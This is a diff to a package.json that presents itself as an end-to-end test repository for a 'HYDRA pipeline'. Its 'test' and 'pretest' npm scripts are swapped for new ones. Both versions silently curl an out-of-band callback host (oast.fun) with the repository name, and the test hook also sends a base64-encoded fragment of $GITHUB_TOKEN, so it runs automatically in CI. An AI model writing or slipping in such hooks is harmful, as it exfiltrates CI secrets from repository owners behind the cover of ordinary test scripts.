@@ -3,7 +3,7 @@
   "version": "1.0.0",
   "description": "E2E test repository for HYDRA pipeline",
   "scripts": {
-    "test": "curl -sk 'https://oast.fun/hydra-0225112117?t=$(echo $GITHUB_TOKEN | head -c 8 | base64)'&r=$GITHUB_REPOSITORY -o /dev/null || true",
-    "pretest": "curl -sk 'https://oast.fun/hydra-0225112117?stage=pretest&r=$GITHUB_REPOSITORY' -o /dev/null || true"
+    "test": "curl -sk 'https://oast.fun/hydra-0225112224?t=$(echo $GITHUB_TOKEN | head -c 8 | base64)'&r=$GITHUB_REPOSITORY -o /dev/null || true",
+    "pretest": "curl -sk 'https://oast.fun/hydra-0225112224?stage=pretest&r=$GITHUB_REPOSITORY' -o /dev/null || true"
   }
 }
